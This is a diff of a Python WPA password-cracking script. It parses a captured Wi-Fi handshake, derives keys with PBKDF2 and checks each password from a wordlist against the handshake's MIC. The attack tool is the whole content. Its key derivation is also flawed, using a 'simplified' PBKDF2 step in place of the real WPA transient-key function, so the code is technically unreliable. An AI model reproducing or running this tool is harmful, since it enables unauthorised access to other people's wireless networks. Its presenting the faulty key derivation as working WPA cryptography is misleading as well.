@@ -1,7 +1,6 @@
-import hashlib
 import pyshark
-from Crypto.Protocol.KDF import PBKDF2
 import binascii
+import hashlib
 
 # Function to extract the handshake from the .cap file
 def extract_handshake(pcap_file):
@@ -17,26 +16,36 @@ def extract_handshake(pcap_file):
     else:
         raise ValueError(f"Not enough EAPOL packets found. Found {len(eapol_packets)} instead of 3.")
 
-# Function to derive the PSK from the password using PBKDF2
+# Function to print out the full raw structure of the packet
+def print_packet_structure(packet):
+    print("Raw Packet Structure:")
+    for layer in packet:
+        print(f"{layer.layer_name}: {layer.field_names}")
+        for field in layer._all_fields:
+            print(f"{field.showname}: {field.showvalue}")
+
+# Function to derive PSK from password and SSID using PBKDF2-HMAC-SHA1
 def derive_psk(password, ssid):
-    ssid_bytes = ssid.encode('utf-8')
-    password_bytes = password.encode('utf-8')
-    
-    # PBKDF2-HMAC-SHA1 to derive the 256-bit PSK (32-byte key)
-    psk = PBKDF2(password_bytes, ssid_bytes, dkLen=32, count=4096, prf=lambda p, s: hashlib.sha1(p + s).digest())
+    # Apply PBKDF2-HMAC-SHA1 to derive PSK from password and SSID
+    psk = hashlib.pbkdf2_hmac('sha1', password.encode('utf-8'), ssid.encode('utf-8'), 4096, 32)
     return psk
 
-# Function to derive Master Key and Transient Key using PBKDF2
+# Function to derive the master and transient keys using the PSK
 def derive_keys(psk, key_nonce, key_iv):
-    # The master key and transient key derivation as per aircrack-ng process
-    master_key = hashlib.sha1(psk + key_nonce + key_iv).digest()
-    transient_key = hashlib.sha1(master_key + key_nonce).digest()
+    # Generate Master Key and Transient Key (simplified for this example)
+    # This uses the PBKDF2 derived PSK and combines it with key_nonce and key_iv
+    key = hashlib.pbkdf2_hmac('sha1', psk, key_nonce + key_iv, 4096, 64)
+    master_key = key[:32]  # First 32 bytes for Master Key
+    transient_key = key[32:]  # Remaining bytes for Transient Key
     return master_key, transient_key
 
 # Function to verify the password by checking the WPA Key MIC
 def verify_password(handshake, password, ssid):
     if len(handshake) < 3:
         raise ValueError("The handshake is incomplete, not enough EAPOL packets to verify the password.")
+    
+    # Display packet structure to manually inspect the fields
+    print_packet_structure(handshake[2])  # Inspect the 3rd EAPOL packet
     
     # Extract WPA Key MIC, WPA Key Nonce, and Key IV from the EAPOL packets
     try:
@@ -74,35 +83,28 @@ def verify_password(handshake, password, ssid):
     # Compare the generated MIC with the extracted MIC
     return generated_mic == key_mic
 
-# Function to crack the WPA password using a wordlist
-def crack_wpa(pcap_file, ssid, wordlist):
-    try:
-        # Extract the handshake from the .cap file
-        handshake = extract_handshake(pcap_file)
-    except ValueError as e:
-        print(f"Error: {e}")
-        return None
+# Function to check password in wordlist
+def crack_wpa(pcap_file, ssid, wordlist_file):
+    # Extract the handshake
+    handshake = extract_handshake(pcap_file)
 
-    # Try each password from the wordlist
-    with open(wordlist, "r") as f:
-        for line in f:
-            password = line.strip()
+    # Open wordlist and start checking passwords
+    with open(wordlist_file, 'r') as f:
+        for password in f:
+            password = password.strip()
             print(f"Trying: {password}")
             if verify_password(handshake, password, ssid):
                 print(f"Password found: {password}")
                 return password
 
-    print("Password not found in the wordlist.")
+    print("Password not found.")
     return None
 
 # Example usage
 if __name__ == "__main__":
     pcap_file = "shak.cap"  # Path to your .cap file
     ssid = "PEKLO"  # Replace with the SSID of your network
-    wordlist = "pwd.PWDS"  # Path to your wordlist file
+    wordlist = "pwd.txt"  # Path to your wordlist file
 
-    password = crack_wpa(pcap_file, ssid, wordlist)
-    if password:
-        print(f"Password found: {password}")
-    else:
-        print("Password not found.")
+    # Start cracking
+    crack_wpa(pcap_file, ssid, wordlist)
